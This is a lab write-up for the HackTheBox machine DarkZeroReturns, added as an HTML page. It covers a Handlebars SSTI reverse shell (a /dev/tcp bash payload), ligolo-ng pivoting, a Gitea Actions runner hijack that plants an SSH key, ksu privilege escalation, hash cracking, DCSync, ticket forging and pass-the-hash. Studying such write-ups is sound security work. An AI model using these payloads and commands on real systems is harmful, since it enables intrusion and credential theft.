@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>DarkZeroReturns - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox DarkZeroReturns (Hard, Windows/AD) full write up: Handlebars SSTI RCE, ligolo-ng pivot, Gitea SSPI login, runner hijack, ksu to root, cross-realm DCSync."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-hard{background:rgba(249,115,22,.1);border:1px solid rgba(249,115,22,.3);color:#f97316}
+.tag-windows{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#60a5fa}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / hard / windows</p>
+      <h1>DarkZeroReturns</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-hard">Hard</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-windows">Windows</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>DarkZeroReturns is a hard AD box. We get a reverse shell via a <strong>Handlebars SSTI</strong> in the campaign editor of the web app. We find a database and crack <code>josh</code>'s hash against rockyou, SSH in as josh, and use <strong>ligolo-ng</strong> to forward traffic to the domain <code>172.16.20.2</code>. Port 3000 runs <strong>Gitea</strong>; we login with <strong>SSPI</strong> as josh, fork the repo, and abuse a self-hosted <strong>Gitea Actions runner</strong> through a crafted workflow to get a shell as <code>svc-runner</code>. From there we create the <code>root</code> principal in the GiteaMigration OU and use <code>ksu</code> to become local root, grab a SQL backup, crack celia's hash, and DCSync across the domain trust to the real DC.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Template injection (SSTI) identification and exploitation</li>
+        <li>Pivoting with ligolo-ng</li>
+        <li>Kerberos / SSPI authentication</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Handlebars SSTI to RCE with a crafted AST</li>
+        <li>Gitea Actions self-hosted runner hijack via PR</li>
+        <li>Gitea Admin OU migration abuse and <code>ksu</code></li>
+        <li>Cross-realm tickets and DCSync</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>Port scan.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-27 15:22 -0400
+Nmap scan report for 10.129.59.170
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://dzcampaigns.htb/</pre>
+      <p>Directory enumeration.</p>
+      <pre>200      GET       29l       65w      786c http://dzcampaigns.htb/js/app.js
+200      GET     1164l     2717w    25823c http://dzcampaigns.htb/css/styles.css
+200      GET      117l      485w     3789c http://dzcampaigns.htb/essentials
+200      GET       70l      155w     2126c http://dzcampaigns.htb/dice
+200      GET       55l      115w     1509c http://dzcampaigns.htb/login
+200      GET       58l      141w     1735c http://dzcampaigns.htb/register
+200      GET       58l      261w     2233c http://dzcampaigns.htb/campaign/1
+200      GET       68l      265w     2470c http://dzcampaigns.htb/
+301      GET       10l       15w      153c http://dzcampaigns.htb/css =&gt; http://dzcampaigns.htb/css/
+302      GET        1l        4w       28c http://dzcampaigns.htb/dashboard =&gt; http://dzcampaigns.htb/login</pre>
+
+      <h2>Foothold</h2>
+      <h3>SSTI in Handlebars</h3>
+      <p>Payloads such as <code>{{7*7}}</code> would give 49 on Jinja or Twig for example. With <code>{{this}}</code> the app responds with <code>object Object</code>, which is a proof for JavaScript. To separate Mustache from Handlebars you can call <code>{{lookup . 'constructor'}}</code>, which is only in Handlebars. SSTI injection.</p>
+
+      <p>In the console while in <code>/campaign/1</code> paste this:</p>
+      <pre>const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: {
+      type: "PathExpression",
+      data: false,
+      depth: 0,
+      parts: ["lookup"],
+      original: "lookup",
+      loc: null
+    },
+    params: [
+      {
+        type: "PathExpression",
+        data: false,
+        depth: 0,
+        parts: [],
+        original: "this",
+        loc: null
+      },
+      {
+        type: "NumberLiteral",
+        value: "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i &gt;&amp; /dev/tcp/[ip]/8000 0&gt;&amp;1\"']).toString() //",
+        original: 1,
+        loc: null
+      }
+    ],
+    escaped: true,
+    strip: { open: false, close: false },
+    loc: null
+  }],
+  strip: {},
+  loc: null
+};
+
+const csrf = document.querySelector('[name="_csrf"]').value;
+
+const r = await fetch("/character/17", {
+  method: "POST",
+  credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    _csrf: csrf,
+    name: "asdffd",
+    race: "afdasfas",
+    class: "asdfasf",
+    backstory: "asfasfasas",
+    campaign_message: ast
+  })
+});
+
+console.log(r.status, await r.text());</pre>
+      <p>Set up a listener and get a reverse shell. Running <code>env</code> reveals a database where we find josh's hash and we crack it against rockyou.txt.</p>
+      <pre>josh   Rangers1</pre>
+      <p>SSH into josh.</p>
+      <pre>ssh josh@dzcampaigns.htb</pre>
+
+      <h2>Pivoting</h2>
+      <h3>Gitea runner and Kerberos</h3>
+      <pre>/opt/gitea-runner/config.yaml
+# cant access it, but tells us that gitea is running</pre>
+      <p>Searching kerberos conf files and tickets (T1558.003).</p>
+      <pre>kadmin was found on /usr/bin/kadmin
+kadmin was found on /usr/bin/kinit
+
+klist execution
+Ticket cache: KEYRING:persistent:780601110:krb_ccache_fwyIQsV
+Default principal: josh@DARKZERO.EXT
+
+Valid starting       Expires              Service principal
+08/01/2026 16:40:16  08/02/2026 02:40:16  krbtgt/DARKZERO.EXT@DARKZERO.EXT
+        renew until 08/08/2026 16:40:16
+
+/etc/krb5.conf
+[libdefaults]
+default_realm = DARKZERO.EXT
+
+[realms]
+    DARKZERO.EXT = {
+        kdc = dc02.darkzero.ext
+        admin_server = dc02.darkzero.ext
+    }
+
+[domain_realm]
+    .darkzero.ext = DARKZERO.EXT
+    darkzero.ext = DARKZERO.EXT</pre>
+
+      <h3>ligolo-ng</h3>
+      <p>Use ligolo-ng to forward traffic from josh to have access to <code>172.16.20.2</code>.</p>
+      <p>Create the tun interface on Kali.</p>
+      <pre>sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up</pre>
+      <p>Start the proxy (Kali, attacker side).</p>
+      <pre>sudo ./proxy -selfcert
+# Listens on 0.0.0.0:11601 by default.</pre>
+      <p>Get agent onto target and run it. Transfer over your existing SSH session.</p>
+      <pre>scp agent josh@SRV01:/tmp/agent
+chmod +x /tmp/agent
+
+# on SRV01
+./agent -connect &lt;KALI_IP&gt;:11601 -ignore-cert</pre>
+      <p>Back in the proxy console (Kali).</p>
+      <pre>[Ligolo-ng] &raquo; session          # select the connected agent
+[Ligolo-ng] &raquo; ifconfig         # view agent's network interfaces/subnets
+[Ligolo-ng] &raquo; start            # start the tunnel</pre>
+      <p>Route Kali traffic into the target subnet.</p>
+      <pre>sudo ip route add 172.16.20.0/24 dev ligolo</pre>
+      <p>On your machine run nmap.</p>
+      <pre>nmap -sCV 172.16.20.2
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.ext)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+3000/tcp open  http          Golang net/http server | Gitea: Git with a cup of tea
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP</pre>
+
+      <h2>Lateral Movement</h2>
+      <h3>Gitea</h3>
+      <p>Port 3000 running gitea. Open the webpage. There are no repos, can't login as josh.</p>
+      <p>Login with SSPI using curl -negotiate.</p>
+      <pre>curl -v --negotiate -c cookies.txt -u : http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1</pre>
+      <pre>Cookies:
+#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   1785698675      _csrf   V5eYuzGp413O-gMQIEDZ4EodZxI6MTc4NTYxMjI3NTc4MjM3NzQwMA
+#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       lang    en-US
+#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       i_like_gitea    3791c43f03f97cb7</pre>
+      <p>Replace the cookies in the browser and reload the page, granting access to user josh. There is a repo here: <code>http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns</code></p>
+
+      <h3>Runner hijack</h3>
+      <p>Use the web interface for this because the API didn't work.</p>
+      <p>1. Create an SSH key.</p>
+      <pre>ssh-keygen -t ed25519 -f ./svc_runner_key -N ""
+cat svc_runner_key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBF5JqcmzgQCqZc6ghjqoqNeywDjwQO2P2J1ARjiT5S9 josh@SRV01</pre>
+      <p>2. Fork the repo.</p>
+      <pre>curl -s --negotiate -u : -X POST \
+  http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks \
+  -H "Content-Type: application/json" -d '{}'</pre>
+      <p>3. Go to the web UI and edit the existing <code>main.yml</code>, replace the whole content with your payload.</p>
+      <pre>on:
+  pull_request_review_comment:
+    types: [created]
+jobs:
+  foothold:
+    runs-on: ubuntu
+    steps:
+      - run: |
+          install -d -m 700 /home/svc-runner/.ssh
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBF5JqcmzgQCqZc6ghjqoqNeywDjwQO2P2J1ARjiT5S9 josh@SRV01' >> /home/svc-runner/.ssh/authorized_keys
+          chmod 600 /home/svc-runner/.ssh/authorized_keys
+          cat /home/svc-runner/user.txt</pre>
+      <p>4. Go to the original repo and create a PR (Pull Request), making sure you are committing to the main one. Note the PR number and head commit SHA, both visible on the PR page.</p>
+      <pre>curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/1 | jq '.head.sha'</pre>
+      <p>5. Trigger via a review comment.</p>
+      <pre>curl -s --negotiate -u : -X POST \
+  http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/1/reviews \
+  -H "Content-Type: application/json" \
+  -d "{\"event\":\"COMMENT\",\"body\":\"trigger\",\"commit_id\":\"44d3b6c319689daa83df409d2bf7d846594c3b7f\"}"</pre>
+      <p>6. Check the Actions tab on the original repo <code>DarkZero/DarkZero-Campaigns</code>.</p>
+      <p>7. SSH in.</p>
+      <pre>ssh -i ./svc_runner_key svc-runner@localhost</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>svc-runner → local root via ksu</h3>
+      <p>Create the <code>root</code> user in the GiteaMigration OU.</p>
+      <pre>bloodyAD --host dc02.darkzero.ext -d DARKZERO.EXT -u svc-runner -k ccache=/tmp/svc-runner.ccache -i 172.16.20.2 --dns 172.16.20.2 add user root 'RootPass123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'</pre>
+      <p>Back on SRV01, get a ticket for the new <code>root</code> principal and invoke <code>ksu</code>.</p>
+      <pre>kinit root@DARKZERO.EXT
+# password: RootPass123!
+ksu root</pre>
+      <p><code>ksu</code> authorizes this with no prompt since there is no <code>.k5login</code> for local root, and the default MIT Kerberos rule is: if the Kerberos principal's first component matches the target local username, access is granted. Confirm and grab the backup file that was previously denied.</p>
+      <pre>whoami
+cat /root/darkzero_campaigns_backup.sql</pre>
+
+      <h3>celia's hash and DCSync</h3>
+      <p>Search the SQL dump for hash-shaped content or a <code>celia</code> reference.</p>
+      <pre>INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
+
+grep -i celia /root/darkzero_campaigns_backup.sql
+grep -iE '[0-9a-f]{32}' /root/darkzero_campaigns_backup.sql</pre>
+      <p>Once you isolate the NT hash, crack it.</p>
+      <pre>echo '&lt;ntlm_hash&gt;' &gt; celia_hash.txt
+hashcat -m 1000 celia_hash.txt /usr/share/wordlists/rockyou.txt</pre>
+      <p>It cracks to <code>babygurl13</code>. DCSync as celia.</p>
+      <pre>impacket-secretsdump DARKZERO.EXT/celia:'babygurl13'@dc02.darkzero.ext -just-dc</pre>
+
+      <h3>Cross-realm ticket</h3>
+      <p>Forge celia's ticket with the CORRECT aes key, saved to its own ccache.</p>
+      <pre>impacket-ticketer \
+  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
+  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
+  -domain darkzero.ext \
+  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
+  -groups 513 -user-id 1109 \
+  celia
+# -> saves celia.ccache</pre>
+      <p>Point KRB5CCNAME at it this time.</p>
+      <pre>export KRB5CCNAME=$(pwd)/celia.ccache
+klist   # confirm principal is celia@DARKZERO.EXT, not Administrator</pre>
+      <p>Request the cross-realm service ticket.</p>
+      <pre>kvno cifs/dc01.darkzero.htb
+klist   # should now show a second entry: cifs/dc01.darkzero.htb@DARKZERO.HTB</pre>
+      <pre>netexec smb 172.16.20.1 -k --use-kcache -M backup_operator</pre>
+      <p>Get the Domain Controller's core Windows Registry hives.</p>
+      <pre>impacket-smbclient -k -no-pass -dc-ip 172.16.20.1 DARKZERO.EXT/celia@dc01.darkzero.htb
+# ls
+# use sysvol
+# get SAM
+# get SYSTEM
+# get SECURITY
+# exit</pre>
+      <p>Run secretsdump.py offline against those hives to extract the local user hashes and LSA secrets.</p>
+      <pre>impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</pre>
+      <p>Get Root Flag.</p>
+      <pre>impacket-wmiexec -hashes :4d470bb7497acf3f5f5c2a11872e02ac Administrator@172.16.20.1</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Fingerprint the template engine first</strong> - <code>{{this}}</code> proves JS, <code>{{lookup . 'constructor'}}</code> proves Handlebars.</li>
+        <li><strong>Kerberos tickets are a pivot tool</strong> - josh's live TGT became our SSPI login to the internal Gitea.</li>
+        <li><strong>Self-hosted runners run repo code</strong> - a PR workflow on a runner with admin rights is a foothold.</li>
+        <li><strong><code>ksu</code> maps principal to local user</strong> - creating a <code>root</code> principal meant direct local root.</li>
+        <li><strong>Cross-realm tickets cross the trust</strong> - celia's forged ticket reached the real DC in the other domain.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
